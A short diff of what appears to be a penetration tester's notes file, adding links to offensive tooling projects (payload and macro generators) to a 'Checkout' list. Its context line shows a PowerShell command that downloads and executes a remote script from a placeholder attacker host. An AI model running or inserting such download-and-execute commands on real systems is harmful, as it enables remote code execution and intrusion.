@@ -71,6 +71,8 @@ IEX(New-Object Net.WebClient).DownloadString("http://<LHOST>/win/powerview.ps1")
 
 ## Checkout
 Below are things I will get around to trying and will add them to the install script if I find them useful.
+- https://github.com/trustedsec/unicorn
+- https://github.com/sevagas/macro_pack
 - https://github.com/Flangvik/SharpCollection
 - https://github.com/bohops/GhostBuild
 - https://github.com/AdrianVollmer/PowerHub
